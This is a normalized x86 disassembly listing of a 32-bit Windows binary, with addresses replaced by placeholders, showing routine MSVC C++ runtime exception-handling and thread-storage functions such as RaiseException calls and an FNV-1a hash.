call sub_40e4a0
add esp 0x8
mov edi ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_4105be
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] edi
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
push esi
push [ ebp - 0x8 ]
mov [ eax + 0xc ] ebx
call sub_40e4a0
mov ecx [ ebp - 0x14 ]
add esp 0x8
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_4105a5
int3
jmp r-xdata
push r--data
call sub_449510
add esp 0x4
test eax eax
je r-xdata
push rw-data
push esi
mov edx edi
mov ecx eax
call sub_4105d7
mov eax [ ebp + 0xc ]
mov esi [ r--data ]
mov ecx esi
push 0x1
push [ ebp + 0x8 ]
call j_sub_40d468
call esi
mov esi [ ebp - 0x10 ]
add esp 0x8
sub_40e691
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov ecx [ edi ]
test ecx ecx
je r-xdata
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ebx
push esi
lea ebx [ ecx + 0x1 ]
push ebx
call sub_42989d
mov esi eax
pop ecx
test esi esi
je r-xdata
push esi
call j_sub_42d0aa#3
pop ecx
pop esi
pop ebx
jmp r-xdata
push [ edi ]
push ebx
push esi
call sub_42cfc7
mov eax [ ebp + 0xc ]
mov ecx esi
add esp 0xc
xor esi esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop edi
pop ebp
retn
sub_40e6f4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
pop ebp
retn
push [ esi ]
call j_sub_42d0aa#3
pop ecx
sub_40e713
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] edi
test edi edi
je r-xdata
test [ edi ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test [ edi ] 0x8
je r-xdata
mov ecx [ ebx ]
sub ecx 0x4
push ecx
mov eax [ ecx ]
mov esi [ eax + 0x20 ]
mov ecx esi
mov edi [ eax + 0x18 ]
call j_sub_40d468
call esi
mov [ ebp - 0xc ] 0x1994000
sub_40e781
call sub_4106b8
call sub_410437
call sub_4105ee
test al al
jne r-xdata
call sub_40eba1
test al al
jne r-xdata
xor al al
retn
call sub_40e480
mov al 0x1
retn
call sub_41063f
jmp r-xdata
sub_40e7c5
push ebp
mov ebp esp
call sub_40e493
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
call sub_40ebd4
call sub_41063f
push 0x0
call sub_41045b
pop ecx
sub_40e908
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cmp eax ecx
jne r-xdata
add ecx 0x5
add eax 0x5
xor eax eax
pop ebp
retn
sbb eax eax
or eax 0x1
pop ebp
retn
test dl dl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
jmp r-xdata
sub_40e944
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InterlockedFlushSList@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push esi
mov esi [ eax ]
push eax
call sub_42d0aa
mov eax esi
pop ecx
test esi esi
jne r-xdata
pop esi
sub_40e967
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx 0x811c9dc5
lea ecx [ eax + 0x5 ]
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
movzx eax al
xor eax edx
imul edx eax 0x1000193
inc ecx
mov eax edx
pop ebp
retn
sub_40e98d
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
[ ebx ] ecx
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push esi
push 0x2800
push j_sub_42d0aa#2
push sub_40e7f7
push eax
lea ecx [ ebx + 0x5 ]
mov [ ebp - 0x4 ] eax
push ecx
push eax
call sub_416516
mov esi eax
add esp 0x18
test esi esi
je r-xdata
push esi
call sub_42d0aa
mov eax [ ebp - 0x4 ]
pop ecx
pop esi
mov ecx esi
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
je r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
add eax 0x4
push edi
push eax
call sub_42d0e4
mov edi eax
pop ecx
test edi edi
je r-xdata
cmp [ esi + ecx - 0x1 ] 0x20
jne r-xdata
push edi
mov [ ebp - 0x4 ] eax
call sub_42d0aa
pop ecx
pop edi
and [ edi ] 0x0
lea eax [ edi + 0x4 ]
push esi
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x4 ] eax
call sub_42cfc7
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor eax eax
[ ebx ] ecx
test eax eax
jne r-xdata
mov [ esi + ecx - 0x1 ] 0x0
sub ecx 0x1
jne r-xdata
push [ ebp - 0xc ]
xor edi edi
push [ ebp + 0xc ]
call [ InterlockedPushEntrySList@IAT ]
mov eax [ ebp - 0x4 ]
sub_40eae5
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x0
push eax
call sub_4103b4
pop ecx
pop ecx
push esi
call sub_40eac9
pop esi
push eax
call sub_41037a
mov esi eax
mov eax [ rw-data ]
pop ecx
sub_40eb29
cmp [ rw-data ] 0xffffffff
jne r-xdata
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_41037a
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
retn
push 0x28
push 0x1
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
jmp r-xdata
push edi
call [ SetLastError@IAT ]
xor edi edi
jmp r-xdata
push esi
push [ rw-data ]
call sub_4103b4
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_42d0aa
pop ecx
mov eax edi
push edi
call [ SetLastError@IAT ]
mov edi esi
xor esi esi
sub_40eba1
push sub_40eac9
call sub_410306
mov [ rw-data ] eax
pop ecx
cmp eax 0xffffffff
jne r-xdata
push rw-data
push eax
call sub_4103b4
pop ecx
pop ecx
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
call sub_40ebd4
jmp r-xdata
sub_40ebf0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41677c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41677c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40ec3c
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_40d2a6
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_40f56b
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_40d468
call esi
sub_40ed14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
lea eax [ ecx + 0x4 ]
push eax
call sub_40e908
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_40ed32
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e6f4
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_42d0aa
pop ecx
sub_40ed5c
push 0x38
push r--data
call sub_40d260
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x3c ] 0x0
mov ebx [ ebp + 0xc ]
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x2c ] eax
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_40d6d9
pop ecx
pop ecx
mov [ ebp - 0x30 ] eax
call sub_40eb1b
mov eax [ eax + 0x10 ]
mov [ ebp - 0x34 ] eax
call sub_40eb1b
mov eax [ eax + 0x14 ]
mov [ ebp - 0x38 ] eax
call sub_40eb1b
mov [ eax + 0x10 ] edi
call sub_40eb1b
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
call sub_40d46c
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40ee97
mov eax ebx
call sub_40d2a6
retn
sub_40edf0
mov esp [ ebp - 0x18 ]
call sub_40eb1b
and [ eax + 0x20 ] 0x0
mov edx [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
push eax
push edx
push 0x0
push ebx
call sub_40fb2c
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40ee97
mov eax ebx
call sub_40d2a6
retn
imul ebx ecx 0x14
mov [ ebp - 0x24 ] ebx
cmp eax [ ebx + edi + 0x4 ]
mov ebx [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] eax
mov edi [ edx + 0x10 ]
xor ecx ecx
mov [ ebp - 0x28 ] ecx
cmp [ edx + 0xc ] ecx
jbe r-xdata
inc ecx
mov [ ebp - 0x28 ] ecx
cmp ecx [ edx + 0xc ]
jb r-xdata
mov ebx [ ebp - 0x24 ]
cmp eax [ ebx + edi + 0x8 ]
mov ebx [ ebp + 0xc ]
jg r-xdata
imul eax ecx 0x14
mov eax [ eax + edi + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov eax [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
sub_40ee97
mov eax [ ebp - 0x2c ]
mov [ ebx - 0x4 ] eax
push [ ebp - 0x30 ]
call sub_40d6fd
pop ecx
call sub_40eb1b
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x10 ] ecx
call sub_40eb1b
mov ecx [ ebp - 0x38 ]
mov [ eax + 0x14 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp [ edi + 0x14 ] 0x19930521
je r-xdata
retn
test ebx ebx
je r-xdata
cmp [ edi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x18 ]
call sub_40d745
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x40 ] 0x0
setne al
movzx eax al
push eax
push edi
call sub_40ec3c
pop ecx
pop ecx
jmp r-xdata
sub_40ef52
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_40f5da
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_40d621
call sub_40d653
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40fb2c
mov eax [ esi + 0x4 ]
inc eax
push 0x100
push [ ebp + 0x28 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40ed5c
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_40efcd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb1b
xor ecx ecx
inc ecx
mov [ eax + 0x20 ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40f017
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
call sub_42cf31
cmp eax [ edi + 0x4 ]
jge r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40eb1b
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push eax
push edi
push [ ebp + 0x14 ]
push ecx
push ebx
push esi
call sub_40f375
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40eb1b
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_40eb1b
mov esi [ eax + 0x10 ]
call sub_40eb1b
mov [ ebp - 0x28 ] 0x1
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
test esi esi
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
push eax
push [ ebp + 0x20 ]
push edi
call sub_40d5a9
mov edx [ ebp - 0x18 ]
add esp 0x14
cmp edx [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_40eb1b
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_40ec3c
pop ecx
pop ecx
lea ecx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_40eb1b
mov eax [ eax + 0x1c ]
mov [ ebp - 0x20 ] eax
call sub_40eb1b
push [ ebp - 0x20 ]
push esi
and [ eax + 0x1c ] 0x0
call sub_40f490
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc edx
add ecx 0x14
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x20 ] ecx
cmp edx [ ebp - 0x2c ]
jb r-xdata
cmp eax [ ecx - 0xc ]
jg r-xdata
push [ ebp - 0x20 ]
call sub_40f52c
pop ecx
test al al
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
jne r-xdata
lea edi [ ecx - 0x10 ]
mov [ ebp - 0x38 ] edi
mov edi [ ebp + 0x18 ]
cmp [ ecx - 0x10 ] eax
jg r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ecx - 0x4 ]
test ebx ebx
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp + 0xc ]
jle r-xdata
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
test [ edi + 0x20 ] 0x4
jne r-xdata
test [ edi + 0x20 ] 0x4
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
mov edx [ eax ]
add eax 0x4
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] edx
push 0x1
push esi
call sub_40ec3c
pop ecx
pop ecx
lea ecx [ ebp - 0x44 ]
call sub_40eceb
push r--data
lea eax [ ebp - 0x44 ]
push eax
call sub_40e713
push [ edi + 0x1c ]
push esi
call sub_40f490
pop ecx
pop ecx
test al al
jne r-xdata
dec eax
add ecx 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] ecx
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
push [ esi + 0x1c ]
push [ eax ]
push ecx
call sub_40fd3e
add esp 0xc
test eax eax
jne r-xdata
call sub_40eb1b
call sub_40eb1b
call sub_40eb1b
mov [ eax + 0x10 ] esi
call sub_40eb1b
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp - 0xc ]
push esi
mov [ eax + 0x14 ] ecx
jne r-xdata
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x34 ]
jmp r-xdata
push [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x20 ]
push [ ebp - 0x38 ]
push [ eax ]
push [ ebp - 0x14 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push ebx
push esi
call sub_40ef52
add esp 0x2c
mov eax [ ebp - 0x24 ]
add [ ebp - 0x10 ] 0x4
dec eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
test eax eax
jg r-xdata
push [ ebp + 0x24 ]
push ebx
jmp r-xdata
mov edi [ ebp - 0x30 ]
mov [ ebp - 0x10 ] edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x24 ] edx
test edx edx
jle r-xdata
mov eax [ ebp - 0x1c ]
call sub_40d653
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push ebx
call sub_40fb2c
add esp 0x10
push [ edi + 0x1c ]
call sub_40ef18
sub_40f375
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
push esi
call sub_40eb1b
mov ebx [ ebp + 0x18 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_40eb1b
cmp [ eax + 0x8 ] esi
je r-xdata
call sub_42cf31
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_40d5a9
mov ecx [ ebp - 0x8 ]
add esp 0x14
mov edx [ ebp - 0x4 ]
cmp ecx edx
jae r-xdata
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40d4cc
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40ef52
mov edx [ ebp - 0x4 ]
add esp 0x2c
mov ecx [ ebp - 0x8 ]
sub_40f490
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_42cf31
mov edi [ esi ]
xor ebx ebx
test edi edi
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
add eax 0x4
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
sub edi 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
add eax edx
mov [ ebp - 0x14 ] eax
mov ecx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
dec eax
add ecx 0x4
mov [ ebp - 0x8 ] eax
test eax eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x14 ]
jg r-xdata
mov edx [ ebp + 0x8 ]
push [ edx + 0x1c ]
push [ ecx ]
push eax
call sub_40fd3e
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub_40f52c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp [ edi ] esi
jle r-xdata
xor al al
mov ebx esi
mov al 0x1
jmp r-xdata
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi + 0x4 ]
push rw-data
mov eax [ ebx + eax + 0x4 ]
add eax 0x4
push eax
call sub_40e908
pop ecx
pop ecx
test eax eax
je r-xdata
sub_40f5b5
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_40f5da
push 0x8
push r--data
call sub_40d260
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40f5b5
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40f572
sub eax 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_40f66c
add esp 0x10
sub eax 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d2a6
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40f5b5
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40f579
jmp r-xdata
sub_40f66c
push 0x10
push r--data
call sub_40d260
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ eax ]
mov esi [ ebp + 0xc ]
test ecx ecx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x14 ]
test cl cl
jns r-xdata
add esi 0xc
add esi edx
mov eax [ ebp + 0x8 ]
test cl 0x8
je r-xdata
test [ edi ] 0x10
je r-xdata
test [ edi ] 0x1
je r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
cmp [ edi + 0x18 ] ebx
jne r-xdata
cmp [ eax + 0x18 ] 0x0
je r-xdata
call sub_42cf31
test esi esi
je r-xdata
mov ecx eax
call j_sub_40d468
call [ ebp - 0x1c ]
mov ecx eax
jmp r-xdata
cmp [ eax + 0x18 ] ebx
je r-xdata
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
test esi esi
je r-xdata
mov [ esi ] ecx
lea eax [ edi + 0x8 ]
push eax
push ecx
jmp r-xdata
test ecx ecx
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
push [ edi + 0x14 ]
push [ eax + 0x18 ]
push esi
call sub_416810
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
call sub_40f5b5
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
test [ edi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x20 ] ebx
push [ edi + 0x14 ]
lea eax [ edi + 0x8 ]
push eax
push ecx
call sub_40f5b5
pop ecx
pop ecx
push eax
push esi
call sub_416810
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
call sub_40d2a6
retn
lea eax [ edi + 0x8 ]
push eax
push [ esi ]
sub_40f79e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb1b
inc [ eax + 0x18 ]
xor eax eax
inc eax
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40f7ea
push ebp
mov ebp esp
sub esp 0x14
push esi
